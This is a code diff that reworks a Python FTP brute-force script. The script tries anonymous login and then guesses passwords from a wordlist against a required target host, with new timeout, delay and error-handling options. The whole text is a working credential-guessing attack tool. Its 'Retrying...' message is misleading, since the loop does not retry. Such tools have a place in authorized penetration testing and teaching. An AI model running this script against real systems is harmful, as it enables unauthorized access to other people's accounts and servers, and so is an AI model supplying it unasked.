@@ -1,53 +1,74 @@
 import ftplib
 import sys
 import argparse
+import time
 
+# Argument parsing
 argparser = argparse.ArgumentParser(description='FTP BruteForcer')
-argparser.add_argument('--host', help='Host to be bruteforced', default='localhost')
+argparser.add_argument('--host', help='Host to be bruteforced', required=True)
 argparser.add_argument('-u', '--username', help='Username to be bruteforced', default='admin')
 argparser.add_argument('-w', '--wordlist', help='Wordlist file', default='passwords.txt')
+argparser.add_argument('-t', '--timeout', help='Connection timeout in seconds', type=int, default=5)
+argparser.add_argument('-d', '--delay', help='Delay between attempts in seconds', type=float, default=0.5)
 
-parsed_args = argparser.parse_args()
+args = argparser.parse_args()
 
-host = parsed_args.host
-username = parsed_args.username
-wordlist = parsed_args.wordlist
+# Main variables
+host = args.host
+username = args.username
+wordlist = args.wordlist
+timeout = args.timeout
+delay = args.delay
 
-def connect(host,user,password):
+# Connection function
+def connect(host, user, password):
     try:
-        ftp = ftplib.FTP(host)
-        ftp.login(user=user, passwd = password)
+        ftp = ftplib.FTP()
+        ftp.connect(host, timeout=timeout)
+        ftp.login(user=user, passwd=password)
         ftp.quit()
         return True
+    except ftplib.error_perm:
+        return False  # Login failed due to incorrect credentials
+    except ftplib.all_errors as e:
+        print(f"[-] FTP error: {e}")
+        return None  # Return None for connection issues
 
-    except Exception as e:
-        return False
-
+# Main function
 def main():
-    print('[+] Using anonymous credentials for ' + host)
+    print(f"[+] Starting FTP Brute Force on Host: {host} | Username: {username}")
 
+    # Check anonymous login
     if connect(host, 'anonymous', ''):
-        print('[+] FTP Anonymous logon succeeded on host: {}'.format(host))
-        exit(0)
+        print(f"[+] FTP Anonymous login succeeded on host: {host}")
+        sys.exit(0)
     else:
-        print('[-] FTP Anonymous logon failed on host : {}'.format(host))
+        print(f"[-] FTP Anonymous login failed on host: {host}")
 
+    # Validate wordlist file
     try:
         with open(wordlist, 'r') as f:
-            pass
+            passwords = f.read().splitlines()
     except FileNotFoundError:
-        print('[-] File not found: {}'.format(wordlist))
-        exit(1)
+        print(f"[-] File not found: {wordlist}")
+        sys.exit(1)
 
-    with open(wordlist, 'r') as f:
-        for line in f:
-            password = str(line.replace('\n',''))
-            print("Testing: " + password)
-            if connect(host,username,password):
-                print("[+] FTP Logon succeeded on host: {} using username: {} and password: {}".format(host,username,password))
-                exit(0)
-            else:
-                print("[-] FTP Logon failed on host: {} using username: {} and password: {}".format(host,username,password))
+    # Brute-force loop
+    for password in passwords:
+        password = password.strip()
+        print(f"[*] Testing password: {password}")
+        
+        result = connect(host, username, password)
+        if result:
+            print(f"[+] Success! Username: {username} | Password: {password}")
+            sys.exit(0)
+        elif result is None:
+            print(f"[!] Connection issue encountered with host: {host}. Retrying...")
+        
+        # Delay between attempts
+        time.sleep(delay)
 
-if __name__ ==  "__main__":
-        main()
+    print("[-] Brute force completed. No valid credentials found.")
+
+if __name__ == "__main__":
+    main()
